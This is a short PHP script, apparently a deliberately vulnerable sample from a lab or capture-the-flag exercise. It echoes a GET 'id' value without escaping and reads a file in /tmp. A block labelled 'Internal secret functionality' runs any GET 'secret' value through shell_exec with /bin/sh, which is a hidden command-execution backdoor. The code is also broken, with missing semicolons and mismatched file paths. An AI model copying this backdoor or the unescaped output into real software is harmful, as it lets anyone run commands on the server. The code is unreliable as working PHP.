<?php

if(isset($_GET['id'])){
    $id = $_GET['id'];
    if (!$id) echo "Check your ID at /whatsmyid/<id>";
    else echo 'You ID is: ' . $id;

    $file = fopen("/tmp/out.txt", "r")
    echo fread($file, filesize("out.txt"))

}

#Internal secret functionality
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];

    shell_exec('/bin/sh ' . $secret);
}

?>